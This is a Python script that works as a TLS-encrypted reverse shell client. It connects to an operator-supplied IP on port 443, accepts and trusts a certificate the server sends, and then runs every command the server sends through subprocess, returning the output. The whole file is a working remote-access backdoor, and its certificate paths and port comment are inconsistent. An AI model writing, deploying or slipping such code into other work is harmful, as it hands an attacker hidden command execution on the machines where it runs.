import socket
import ssl
import subprocess

import os

def connect(ip, port):
    """
    Connect to server, receive and save certificate, then establish TLS.
    """
    with socket.create_connection((ip, port)) as sock:
        print(f"[*] Connected to server at {ip}:{port}")
        # Receive and save certificate
        cert_size = int.from_bytes(sock.recv(4), byteorder="big")  # Receive certificate size
        cert_data = sock.recv(cert_size)  # Receive certificate data
        os.makedirs("keys", exist_ok=True)  # Ensure keys directory exists
        with open("keys/server.crt", "wb") as cert_file:
            cert_file.write(cert_data)  # Save certificate
        print("[*] Certificate received from server.")

        # Establish TLS connection using received certificate
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations("/root/keys/server.crt")
        with context.wrap_socket(sock, server_hostname=ip) as ssock:
            while True:
                command = ssock.recv(8192).decode()
                if command.lower() == "exit":
                    break
                output = subprocess.getoutput(command)
                ssock.sendall(output.encode())

if __name__ == "__main__":
    server_ip = input("Enter the server IP address: ").strip()
    # Change port to 9999 to match server
    port = 443 
    if server_ip:
        connect(server_ip, port)
    else:
        print("[!] IP address is required. Exiting.")